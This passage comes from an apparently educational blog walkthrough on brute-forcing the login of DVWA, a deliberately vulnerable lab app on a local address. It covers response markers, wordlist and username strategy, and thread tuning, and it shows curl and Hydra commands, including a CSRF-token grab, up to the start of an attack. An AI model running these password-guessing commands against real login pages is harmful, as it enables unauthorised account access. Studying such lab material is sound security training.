&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=low' -b dvwa.cookie -i 'http://192.168.1.44/DVWA/vulnerabilities/brute/?username=admin&amp;amp;password=password&amp;amp;Login=Login' &amp;gt; success.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# diff failed.txt success.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;9c9
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Content-Length: 4945
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Content-Length: 5007
&lt;/span&gt;&lt;span class="line"&gt;81c81
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;     &amp;lt;pre&amp;gt;&amp;lt;br /&amp;gt;Username and/or password incorrect.&amp;lt;/pre&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;     &amp;lt;p&amp;gt;Welcome to the password protected area admin&amp;lt;/p&amp;gt;&amp;lt;img &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA/hackable/users/admin.jpg&amp;quot;&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Test lab vs Production target" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-07.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Blacklisting.vs.Whitelisting"&gt;&lt;/a&gt;
&lt;h3&gt;Blacklisting vs Whitelisting&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Blacklisting, you are ignoring all results that do not contain phrase. Whitelisting, you are looking for a specific value to be successful.&lt;/p&gt;

&lt;p&gt;We need to identify a key point to "mark" how the web application will respond when a login is incorrect (aka blackisting) or if it was successful (aka whitelisting).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Blacklisting often contains more false positives&lt;/strong&gt;, where it believes it has successfully logged in, when it really failed. This is because &lt;strong&gt;you have to rule out "every" possible combination other than a successful login&lt;/strong&gt;.
Depending on the web application, &lt;strong&gt;it may respond differently for any number of reasons at any stage&lt;/strong&gt;. If the marker does not appear on the page, it will believe it logged in correctly.
An example: if the marker was set to &lt;code&gt;incorrect password&lt;/code&gt;, or if the web app responded with &lt;code&gt;incorrect username/password&lt;/code&gt; because it is not an exact match, the program will believe it is a correct login. If the web application responded with &lt;code&gt;incorrect CSRF token&lt;/code&gt;, the program would believe it was a successful login, even though it was not. Using &lt;code&gt;incorrect&lt;/code&gt; would be better here as it appears in both statements. However, if the marker is too general, this may cause issues. The marker needs to be as unique as possible.&lt;/p&gt;

&lt;p&gt;The advantage of using blacklisting is that it is easier to discover a failed login attempt rather than a successful one, so it is easier to begin with. Another benefit is, you get to see how the web application responds differently over time and all responses. This means it is easier to debug issues more quickly.&lt;/p&gt;

&lt;p&gt;For &lt;strong&gt;whitelisting&lt;/strong&gt;, they give a more accurate way of knowing if you have logged in correctly, rather than having to rule out every response which is incorrect. The down side to it is if, during the request the page starts to respond differently, we might not be aware, and will just blindly keep attacking, which might be a waste of time. An example is, if an API key has reached its maximum amount of requests for a given period of time.&lt;/p&gt;

&lt;p&gt;The "best" way would be to use a mixture of them; ignore all pages that respond in a certain way, print pages which do not match any known response, and quit if a certain value is found (Hydra does not support this, but Patator supports various operators and condition requirements).&lt;/p&gt;

&lt;p&gt;Anyway... Getting back to DVWA brute forcing, we could risk doing a whitelist attack and make an educated guess at the response (such as: &lt;code&gt;welcome&lt;/code&gt;, &lt;code&gt;logged in&lt;/code&gt;, &lt;code&gt;successful&lt;/code&gt;, &lt;code&gt;hello&lt;/code&gt;, &lt;code&gt;thank you&lt;/code&gt; etc.), as we do not know what a correct login looks like &lt;em&gt;(because we are ignoring the section above)&lt;/em&gt;. However, this means we might have to wait as we make multiple complete attempts and also hope a user's password is in our wordlist. So &lt;strong&gt;rather than guessing, let's use what we know&lt;/strong&gt;,  &lt;em&gt;(and understand the attack might not work due to an unknown page response, and having to repeat it)&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This means we can use either the HTML output of &lt;code&gt;Username and/or password incorrect.&lt;/code&gt;, or the page length being &lt;code&gt;4945&lt;/code&gt; as markers to ignore. As the HTML is more of a unique marker, we will start by using that (sometimes web applications put various statics in the response, such as page generation time, or a full data stamp which may cause the page length to be different each request - &lt;em&gt;comparing multiple reponses could rule this out&lt;/em&gt;). This means any pages which do contain it as incorrect. Therefore any pages which do not contain the phrase, will be seen as "successful" (hopefully this is correct and the web app does not start to behave differently). If it does, we will need ether to also include the additional value or to re-think the marker completely.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Usernames..amp..Wordlists"&gt;&lt;/a&gt;
&lt;h3&gt;Usernames &amp;amp; Wordlists&lt;/h3&gt;

&lt;p&gt;Normally, people are after the "main" user account on the system (often called &lt;code&gt;admin&lt;/code&gt;, &lt;code&gt;root&lt;/code&gt;, &lt;code&gt;system&lt;/code&gt;), as this is the account that normally has most access over the system. Often this has user id "1" as it is the "first" user account on the system. Depending on the web application there might be "group" control, allowing multiple users to share certain values. If this is the case, there is often an "administrative" group control which is desirable to attackers, which will be a good alterative if the main account is inaccessible.&lt;/p&gt;

&lt;p&gt;So during our attacks, we will do two commands. One for a "single user", where we try for the main account (in DVWA case, &lt;code&gt;admin&lt;/code&gt;), and then another command to attack multiple users. DVWA by default comes with a total of five accounts. We want to target them all!&lt;/p&gt;

&lt;p&gt;We have crafted a username wordlist ourselves. How do we know what values? &lt;strong&gt;Depends on the web application&lt;/strong&gt;! There are various ways to enumerate users on the system (Are they made public at all? Are we able to exact anything from "Forgotten user password"? Can we map "User IDs" to usernames? Email addresses? Can we just "guest"?). However, in this case, for DVWA:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;There is &lt;strong&gt;not a list of public usernames&lt;/strong&gt; on the web applications.&lt;/li&gt;
&lt;li&gt;There is &lt;strong&gt;not a "sign up"&lt;/strong&gt; or &lt;strong&gt;"forgotten password"&lt;/strong&gt; function.&lt;/li&gt;
&lt;li&gt;Being an end user - we are &lt;strong&gt;able to map User IDs&lt;/strong&gt; to first/last names (not usernames) by a core function in the web application using the "SQL injection module".

&lt;ul&gt;
&lt;li&gt;Using this, we could start to build up a custom username wordlist.&lt;/li&gt;
&lt;li&gt;Example: user id: &lt;code&gt;2&lt;/code&gt;, First name: &lt;code&gt;Gordon&lt;/code&gt;, Surname: &lt;code&gt;Brown&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;This would be all the information need to figure out his uname is: &lt;code&gt;gordonb&lt;/code&gt; (&lt;code&gt;&amp;lt;surname&amp;gt;&amp;lt;first letter of first name&amp;gt;&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web application is free &amp;amp; open source. &lt;strong&gt;Looking at the source code&lt;/strong&gt;, there are five &lt;strong&gt;default accounts&lt;/strong&gt;, &lt;strong&gt;hardcoded into the setup&lt;/strong&gt; &lt;em&gt;(and passwords in plain text)&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Some are usernames &lt;strong&gt;hinted at in the "help page"&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;There is also a &lt;strong&gt;SQL injection in the page&lt;/strong&gt; (when on low security level):

&lt;ul&gt;
&lt;li&gt;Able to enumerate the whole user database (get a list of usernames).&lt;/li&gt;
&lt;li&gt;Extract the hash value of the passwords (allowing for offline brute force attack, which is MUCH quicker than online brute force).&lt;/li&gt;
&lt;li&gt;Replace the hashes with known values.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#*comingsoon*"&gt;&lt;del&gt;...more about this later&lt;/del&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;A wordlist (sometimes referred to as a dictionary file) is just a plain text file, which contains possible values to try separated out by a common perimeter (often a new line). The file extension does not matter for the text file (often they are &lt;code&gt;.lst&lt;/code&gt;, &lt;code&gt;.dic&lt;/code&gt;, &lt;code&gt;.txt&lt;/code&gt; or missing completely)!&lt;/p&gt;

&lt;p&gt;We are going to cycle through the usernames before trying the next password, allowing us to focus on the password. This is an in-built feature in Hydra (&lt;code&gt;-u&lt;/code&gt;), and Patator supports this based on the ID value of the wordlist. It will not matter if there is a single user in the attack, only when trying multiple usernames. The reason why this could speed up an attack is, (un)fortunately people &lt;em&gt;(still)&lt;/em&gt; use common passwords. Different users may have the same password as they do not have to be unique (whereas usernames do). e.g. this means every user who has &lt;code&gt;password&lt;/code&gt; as their password, will be discovered very close together.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Threads..amp..Timeouts"&gt;&lt;/a&gt;
&lt;h3&gt;Threads &amp;amp; Timeouts&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Depends on your network connection &amp;amp; target machine. There is not often a need to alter it from default values (unless trying to debug)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Brute forcing is slow&lt;/strong&gt;. The speed will be because of the slowest point in the system, and there are various places where it will slow down.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;System resources

&lt;ul&gt;
&lt;li&gt;Applies to both for the attacker and target machine&lt;/li&gt;
&lt;li&gt;Researched CPU limit? Maxed out on RAM? Hard drive input/output rate?&lt;/li&gt;
&lt;li&gt;Network speed (both up/down stream of both parties)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What is the target?

&lt;ul&gt;
&lt;li&gt;What is the service? (HTTP? SSH? FTP?)&lt;/li&gt;
&lt;li&gt;What is the application? (Open source? Custom made?)&lt;/li&gt;
&lt;li&gt;Does it use a database? Is it local to the target? How many requests does the application make to the database?&lt;/li&gt;
&lt;li&gt;What functions does the application perform? (E.g. calculating password hashes. Certain ones can be more demanding, therefore, increasing the work load).&lt;/li&gt;
&lt;li&gt;Any other users, using the target at the same time?&lt;/li&gt;
&lt;li&gt;Port exhaustion? Can the target handle all those requests?&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;...and all of this is before any brute force protection is in place (e.g. firewalls, account lockouts etc.)!&lt;/p&gt;

&lt;p&gt;Because the amount of requests is &lt;code&gt;username&lt;/code&gt; * &lt;code&gt;password&lt;/code&gt;, the total requests can quickly grow, therefore taking much longer to complete. This is a reason why information gathering &amp;amp; profiling is useful, to know the exact username(s) to target (rather than just guessing). Thereforce using custom built wordlists should give a higher success rate than using a general one (e.g. the chance of a target's password being in an English 65GB wordlist is low if the target does not speak English/have an English keyboard).&lt;/p&gt;

&lt;p&gt;Due to the amount of time it may possibly take, there is an urge to tweak the brute force method (e.g. increase the thread count, lower the wait time). However, there is not a fixed "magic number" (it is more of an "art", than a "science"). Altering these values too much, may cause more issues in the long run.&lt;/p&gt;

&lt;p&gt;Example: putting the thread count "too high", could cause an extreme amount of requests to a web server. An issue could be the attacker is able to product more network traffic than the target OS/application can handle. Another thing could be, for each request the OS sets aside a certain amount of system resources and soon the target system may run out of memory. It all depends on the setup, the target, and, its configuration. The more requests sent to the target, the harder it has to work, therefore, the response time will start to be slower (so the wait time/timeout values would also need to be increased).&lt;/p&gt;

&lt;p&gt;If everything is working "correctly" lowering the wait time does not often archive anything. Example: if the timeout is set to 10 seconds, but it takes less than 1 second to respond, having it at 5 seconds or even 3 seconds will not make any difference. On one hand, having the value too low could mean valid requests are ignored. However, if there starts to be an increase in requests requests taking a longer period of time to response back, for whatever reason, you may be waiting unnecessary (this could signal there is another issue/protection in place).&lt;/p&gt;

&lt;p&gt;Another thing to keep in mind, depending on the tool used, it may not display if a request "timed out" or even check periodically to see if the service is still active. Meaning the part of the attack could be pointless.&lt;/p&gt;

&lt;p&gt;The last point is, the system may respond differently depending "how it pushed" and "how much it was pushed".&lt;/p&gt;

&lt;p&gt;Instead, what might be a better methodology, is having the wordlist sorted in a certain order. This may help speed up the attack (having the more common values at the start). There are various ways to create a custom targeted wordlist, but this going offtopic. Just bare in mind, you may not have to go through the complete wordlist, there is a 50% chance it will be in the first half ;-).&lt;/p&gt;

&lt;p&gt;It might also mean taking multiple runs for it to be successful, one at once (serial rather than parallel). E.g. one wordlist with default credentials, another with commonly used passwords, and another with just a baseline wordlist then another try with "mangled rule" applied to the prior1 wordlist. So each time the size of the wordlist would grow, taking longer, but there will be less chance of missing the "low hanging fruit". I believe it is "better" to make lots of smaller attacks rather than being lazy and making one big one.&lt;/p&gt;

&lt;p&gt;During the debugging stage, I used a single thread (so it is easier to follow the request in a proxy/watching web logs), with a larger timeout value (as I could then tweak the values in Burp's intercept screen), and added in a delay after the thread finished (so I could check all the output).
For the "final" attack, I was on a LAN connection, rather than WAN/Internet, therefore, the speeds would be quicker. Because the response times were so low, the slowest point normally was not the network connection (therefore increasing the threads would not help a great deal in this case). See the benchmark results!&lt;/p&gt;

&lt;p&gt;Getting the attack to use the maximum performance first time is rare =).&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="L.strong.Hydra..strong."&gt;&lt;/a&gt;
&lt;h2&gt;&lt;strong&gt;Hydra&lt;/strong&gt;&lt;/h2&gt;

&lt;a name="Hydra.Documentation"&gt;&lt;/a&gt;
&lt;h3&gt;Hydra Documentation&lt;/h3&gt;

&lt;p&gt;First tool we are going to use is &lt;code&gt;THC-Hydra&lt;/code&gt; (more commonly known as just &lt;code&gt;Hydra&lt;/code&gt;). This is probably the "most well-known" tool (as it has been around since August 2000 with the public release of v0.3). Since Hydra has been around for so long, it supports a very wide range of modules/attack methods in any tool, and it is still getting updates!&lt;/p&gt;

&lt;p&gt;Here are snippets from the documentation (&lt;code&gt;readme.txt&lt;/code&gt;, help screens: &lt;code&gt;hydra -h&lt;/code&gt; &amp;amp; &lt;code&gt;hydra -U http-post-form&lt;/code&gt;, &amp;amp; man page: &lt;code&gt;man hydra&lt;/code&gt;).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
&lt;/span&gt;&lt;span class="line"&gt;  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
&lt;/span&gt;&lt;span class="line"&gt;  -e nsr    try &lt;span class="s2"&gt;&amp;quot;n&amp;quot;&lt;/span&gt; null password, &lt;span class="s2"&gt;&amp;quot;s&amp;quot;&lt;/span&gt; login as pass and/or &lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt; reversed login
&lt;/span&gt;&lt;span class="line"&gt;  -u        loop around users, not passwords &lt;span class="o"&gt;(&lt;/span&gt;effective! implied with -x&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -f / -F   &lt;span class="nb"&gt;exit &lt;/span&gt;when a login/pass pair is found &lt;span class="o"&gt;(&lt;/span&gt;-M: -f per host, -F global&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -t TASKS  run TASKS number of connects in parallel &lt;span class="o"&gt;(&lt;/span&gt;per host, default: 16&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -w / -W TIME  waittime &lt;span class="k"&gt;for&lt;/span&gt; responses &lt;span class="o"&gt;(&lt;/span&gt;32s&lt;span class="o"&gt;)&lt;/span&gt; / between connects per thread
&lt;/span&gt;&lt;span class="line"&gt;  -v / -V / -d  verbose mode / show login+pass &lt;span class="k"&gt;for&lt;/span&gt; each attempt / debug mode
&lt;/span&gt;&lt;span class="line"&gt;  -q        &lt;span class="k"&gt;do&lt;/span&gt; not print messages about connection errors
&lt;/span&gt;&lt;span class="line"&gt;  -U        service module usage details
&lt;/span&gt;&lt;span class="line"&gt;  server    the target: DNS, IP or 192.168.0.0/24 &lt;span class="o"&gt;(&lt;/span&gt;this OR the -M option&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  service   the service to crack &lt;span class="o"&gt;(&lt;/span&gt;see below &lt;span class="k"&gt;for&lt;/span&gt; supported protocols&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  OPT       some service modules support additional input &lt;span class="o"&gt;(&lt;/span&gt;-U &lt;span class="k"&gt;for&lt;/span&gt; module &lt;span class="nb"&gt;help&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;HYDRA_PROXY_HTTP or HYDRA_PROXY - and &lt;span class="k"&gt;if&lt;/span&gt; needed HYDRA_PROXY_AUTH - environment &lt;span class="k"&gt;for&lt;/span&gt; a proxy setup.
&lt;/span&gt;&lt;span class="line"&gt;E.g.:  % &lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;HYDRA_PROXY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;socks5://127.0.0.1:9150 &lt;span class="o"&gt;(&lt;/span&gt;or socks4:// or connect://&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;       % &lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;HYDRA_PROXY_HTTP&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://proxy:8080
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;...SNIP...
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Syntax:   &amp;lt;url&amp;gt;:&amp;lt;form parameters&amp;gt;:&amp;lt;condition string&amp;gt;&lt;span class="o"&gt;[&lt;/span&gt;:&amp;lt;optional&amp;gt;&lt;span class="o"&gt;[&lt;/span&gt;:&amp;lt;optional&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;...SNIP...
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Third is the string that it checks &lt;span class="k"&gt;for&lt;/span&gt; an *invalid* login &lt;span class="o"&gt;(&lt;/span&gt;by default&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt; Invalid condition login check can be preceded by &lt;span class="s2"&gt;&amp;quot;F=&amp;quot;&lt;/span&gt;, successful condition
&lt;/span&gt;&lt;span class="line"&gt; login check must be preceded by &lt;span class="s2"&gt;&amp;quot;S=&amp;quot;&lt;/span&gt;.
&lt;/span&gt;&lt;span class="line"&gt; This is where most people get it wrong. You have to check the webapp what a
&lt;/span&gt;&lt;span class="line"&gt; failed string looks like and put it in this parameter!
&lt;/span&gt;&lt;span class="line"&gt; &lt;span class="s2"&gt;&amp;quot;/login.php:user=^USER^&amp;amp;pass=^PASS^:incorrect&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;...SNIP...
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Note that &lt;span class="k"&gt;if&lt;/span&gt; you are going to put colons &lt;span class="o"&gt;(&lt;/span&gt;:&lt;span class="o"&gt;)&lt;/span&gt; in your headers you should escape them with a backslash &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="se"&gt;\)&lt;/span&gt;.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;a name="Debugging.Hydra.with.Burp.Proxy"&gt;&lt;/a&gt;
&lt;h3&gt;Debugging Hydra with Burp Proxy&lt;/h3&gt;

&lt;p&gt;We could use &lt;code&gt;wireshark&lt;/code&gt; or &lt;code&gt;tcpdump&lt;/code&gt; to monitor what is sent to and from Hydra, as well as use the in-built "debug" flag (&lt;code&gt;-d&lt;/code&gt;). However, the issue with all of these is there is an awful lot of data put on the screen, which makes it harder to understand what is going on.&lt;/p&gt;

&lt;p&gt;Incomes the use of a "proxy". Rather than it being used in an attempt to "hide your IP" (by using another machine fisrt in order to connect to the target, instead of going directt), we can use it to inspect the traffic. Using &lt;code&gt;Burp Proxy Suite&lt;/code&gt;, we can monitor what is being sent to and from our target. This way we can check to see if Hydra is acting in our desired way and reacts correctly when there is a successful login. By using Burp, we are able to quickly filter, sort and compare all of the requests.
&lt;em&gt;It is also worth noting that Hydra does come with a verbose option (&lt;code&gt;-v&lt;/code&gt;) to display more information than standard, but not as much as debug!&lt;/em&gt;&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 'http://192.168.1.44/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;http://192.168.1.44/DVWA/login.php&amp;quot; &amp;gt;/dev/null&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# sed -i '/security/d' dvwa.cookie&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# rm -f hydra.restore; export HYDRA_PROXY_HTTP=http://127.0.0.1:8080&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# hydra -l admin -p password -e ns -F -t 1 -w 5 -W 1 -v -V 192.168.1.44 http-get-form \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="s2"&gt;&amp;quot;/DVWA/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:F=Username and/or password incorrect.:H=Cookie\: security=low; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra v8.1 &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span class="k"&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class="k"&gt;for&lt;/span&gt; illegal purposes.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; starting at 2015-10-22 21:56:20
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; Using HTTP Proxy: http://127.0.0.1:8080
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFORMATION&lt;span class="o"&gt;]&lt;/span&gt; escape sequence &lt;span class="se"&gt;\:&lt;/span&gt; detected in module option, no parameter verification is performed.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; max &lt;span class="m"&gt;1&lt;/span&gt; task per &lt;span class="m"&gt;1&lt;/span&gt; server, overall &lt;span class="m"&gt;64&lt;/span&gt; tasks, &lt;span class="m"&gt;3&lt;/span&gt; login tries &lt;span class="o"&gt;(&lt;/span&gt;l:1/p:3&lt;span class="o"&gt;)&lt;/span&gt;, ~0 tries per task
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; attacking service http-get-form on port 80
